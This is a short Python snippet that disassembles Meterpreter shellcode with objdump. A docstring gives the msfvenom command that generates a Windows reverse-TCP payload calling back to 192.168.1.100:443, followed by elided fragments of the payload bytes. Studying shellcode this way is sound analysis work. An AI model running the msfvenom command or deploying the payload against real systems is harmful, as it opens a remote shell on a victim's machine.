...
import os
"""
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -f python -v shellcode
...
shellcode += b"\x52\x30\x89\xe5\x8b\x52\x0c\x8b\x52\x14\x0f"
...
shellcode += b"\x8b\x48\x18\x8b\x58\x20\x01\xd3\x50\x85\xc9"
shellcode += b"\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31"
...
shellcode += b"\x0a\x68\xc0\xa8\x01\x64\x68\x02\x00\x01\xbb"
...
with open("/tmp/disassemble.tmp", "wb") as tempOut:
    tempOut.write(shellcode)

os.system("objdump -b binary -D -m i386 -M intel /tmp/disassemble.tmp && rm /tmp/disassemble.tmp")